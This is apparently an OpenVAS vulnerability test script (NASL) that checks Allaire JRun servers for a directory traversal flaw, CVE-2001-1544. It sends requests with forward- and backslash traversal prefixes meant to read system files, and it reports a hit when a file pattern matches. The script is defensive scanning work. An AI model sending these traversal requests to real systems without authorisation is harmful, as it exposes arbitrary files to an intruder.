###############################################################################
# OpenVAS Vulnerability Test
# $Id: DDI_JRun_Traversal.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# JRun directory traversal
#
# Authors:
# H D Moore
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID
#
# Copyright:
# Copyright (C) 2002 Digital Defense Inc.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10997");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2001-1544");
  script_bugtraq_id(3666);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("JRun directory traversal");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2002 Digital Defense Inc.");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8000);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"The vendor has addressed this issue in Macromedia Product Security
  Bulletin MPSB01-17. Please upgrade to the latest version of JRun.");

  script_tag(name:"summary", value:"This host is running the Allaire JRun web server. Versions 2.3.3, 3.0, and
  3.1 are vulnerable to a directory traversal attack.");

  script_tag(name:"impact", value:"This allows a potential intruder to view the contents of any file on the system.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.allaire.com/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:8000);

wkey = string("web/traversal/", port);
trav = get_kb_item(wkey);
if (trav) exit(0);

files = traversal_files();

foreach prefix(make_list("/../../../../../../../../", "/..\..\..\..\..\..\..\..\")) {

  foreach pattern(keys(files)) {

    file = files[pattern];

    url = prefix + file;

    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(data:req, port:port);
    if (isnull(res)) continue;

    if(egrep(string:res, pattern:pattern)) {
      set_kb_item(name:"web/traversal/" + port, value:TRUE);
      report = report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);